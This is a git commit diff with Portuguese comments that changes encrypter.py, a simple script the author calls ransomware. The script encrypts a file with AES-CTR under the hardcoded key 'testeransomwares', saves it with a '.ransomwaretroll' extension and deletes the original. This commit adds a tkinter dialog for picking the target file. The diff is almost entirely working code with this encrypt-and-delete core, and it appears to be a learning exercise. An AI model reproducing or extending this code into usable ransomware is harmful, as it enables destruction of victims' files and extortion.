0a192c1d1035852d632c224a9c64255884ddd3f6
fernandorodr <40827174+fernandorodr@users.noreply.github.com>
2023-11-16 11:41:48 -0300

    Alterado encrypter.py
    Alterado para selecionar o arquivo que vai criptografar

--- encrypter.py
+++ encrypter.py
@@ -1,24 +1,40 @@
 import os
 import pyaes
+from tkinter import Tk, filedialog
 
-## abrir o arquivo a ser criptografado
-file_name = "teste.txt"
-file = open(file_name, "rb")
-file_data = file.read()
-file.close()
+def encrypt_file(file_path, key):
+    try:
+        with open(file_path, "rb") as file:
+            file_data = file.read()
 
-## remover o arquivo
-os.remove(file_name)
+            aes = pyaes.AESModeOfOperationCTR(key)
+            crypto_data = aes.encrypt(file_data)
 
-## chave de criptografia
-key = b"testeransomwares"
-aes = pyaes.AESModeOfOperationCTR(key)
+            encrypted_file_path = file_path + ".ransomwaretroll"
+            with open(encrypted_file_path, "wb") as new_file:
+                new_file.write(crypto_data)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+            print(f"Arquivo criptografado salvo como: {encrypted_file_path}")
+            return encrypted_file_path
+    except Exception as e:
+        print(f"Ocorreu um erro durante a criptografia: {e}")
+        return None
 
-## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+def main():
+    root = Tk()
+    root.withdraw()
+    file_path = filedialog.askopenfilename(title="Selecione o arquivo para criptografar")
+
+    if file_path:
+        key = b"testeransomwares"  # Sua chave de criptografia
+
+        encrypted_file = encrypt_file(file_path, key)
+        if encrypted_file:
+            try:
+                os.remove(file_path)
+                print(f"Arquivo original removido: {file_path}")
+            except Exception as e:
+                print(f"Não foi possível remover o arquivo original: {e}")
+
+if __name__ == "__main__":
+    main()
